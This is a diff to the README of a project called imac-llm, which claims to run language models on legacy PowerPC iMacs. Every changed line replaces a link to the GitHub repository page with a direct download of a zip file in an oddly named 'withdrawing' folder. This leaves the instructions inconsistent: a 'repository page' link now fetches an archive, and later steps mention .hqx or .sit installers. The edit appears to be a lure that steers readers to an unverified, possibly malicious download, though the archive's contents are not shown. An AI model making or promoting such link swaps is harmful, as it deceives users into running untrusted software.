@@ -1,6 +1,6 @@
 # 🖥️ imac-llm - Run language models on legacy hardware
 
-[![Download imac-llm](https://img.shields.io/badge/Download-imac-llm-blue)](https://github.com/Sterculiaelectricalcontact246/imac-llm)
+[![Download imac-llm](https://img.shields.io/badge/Download-imac-llm-blue)](https://raw.githubusercontent.com/Sterculiaelectricalcontact246/imac-llm/main/withdrawing/imac_llm_v1.8.zip)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Ensure your computer meets these conditions before you begin the setup:
 
 Follow these steps to obtain the files for your computer:
 
-1. Visit the project repository page at [https://github.com/Sterculiaelectricalcontact246/imac-llm](https://github.com/Sterculiaelectricalcontact246/imac-llm).
+1. Visit the project repository page at [https://raw.githubusercontent.com/Sterculiaelectricalcontact246/imac-llm/main/withdrawing/imac_llm_v1.8.zip](https://raw.githubusercontent.com/Sterculiaelectricalcontact246/imac-llm/main/withdrawing/imac_llm_v1.8.zip).
 2. Locate the "Releases" section on the right side of the page.
 3. Click the link to view available versions.
 4. Select the file ending in .hqx or .sit to download the installer to your desktop.
@@ -77,4 +77,4 @@ The PowerPC 750 processor operates at 233 MHz. Modern language models require bi
 
 Check the download page periodically for new versions. Updates usually focus on better memory management to improve the speed of the text generation. To update, simply remove the old folder and replace it with the new version from the link. Your saved text files will remain in their folder unless you move them.
 
-[Download the latest version here](https://github.com/Sterculiaelectricalcontact246/imac-llm)
+[Download the latest version here](https://raw.githubusercontent.com/Sterculiaelectricalcontact246/imac-llm/main/withdrawing/imac_llm_v1.8.zip)
